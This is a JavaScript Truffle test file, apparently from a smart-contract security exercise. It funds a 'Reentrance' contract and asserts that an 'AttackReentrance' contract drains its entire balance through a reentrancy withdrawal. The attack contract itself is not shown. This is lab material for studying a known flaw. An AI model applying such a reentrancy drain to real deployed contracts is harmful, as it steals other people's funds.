const Reentrance = artifacts.require("Reentrance")
const AttackReentrance = artifacts.require("AttackReentrance")


let reentranceInstance
let attackReentranceInstance

contract('Reentrance', (accounts) => {

    before(async () => {
      reentranceInstance = await Reentrance.deployed()
      attackReentranceInstance = await AttackReentrance.deployed()
    })
  
    it('Fund Reentrance with 1 finney from accounts[0]', async () => {
      await reentranceInstance.donate(accounts[0], {from: accounts[0], value: web3.utils.toWei("1", "finney")})
      let balanceContract = await web3.eth.getBalance(Reentrance.address)
      assert.equal(balanceContract, web3.utils.toWei("1", "finney"))
      let balanceAccount0 = await reentranceInstance.balanceOf(accounts[0])
      assert.equal(balanceAccount0, web3.utils.toWei("1", "finney"))
    });

    it('Fund Reentrance with 1 finney from the attack contract', async () => {
        await attackReentranceInstance.loadBalance({from: accounts[1], value: web3.utils.toWei("1", "finney")})
        let balanceContract = await web3.eth.getBalance(Reentrance.address)
        assert.equal(balanceContract, web3.utils.toWei("2", "finney"))
        let balanceAttackContract = await reentranceInstance.balanceOf(AttackReentrance.address)
        assert.equal(balanceAttackContract, web3.utils.toWei("1", "finney"))
      });

      it('Attackcontract drains all funds from Reentrance contract', async () => {
        try {
            await attackReentranceInstance.requestWithdraw({from: accounts[1]})
            
        } catch (error) {
            console.log(error.message);
        }
        
        let balanceContract = await web3.eth.getBalance(Reentrance.address)
        assert.equal(balanceContract, 0)
        let balanceAttackContract = await web3.eth.getBalance(AttackReentrance.address)
        assert.equal(balanceAttackContract, web3.utils.toWei("2", "finney"))
      });

    
  
    
  });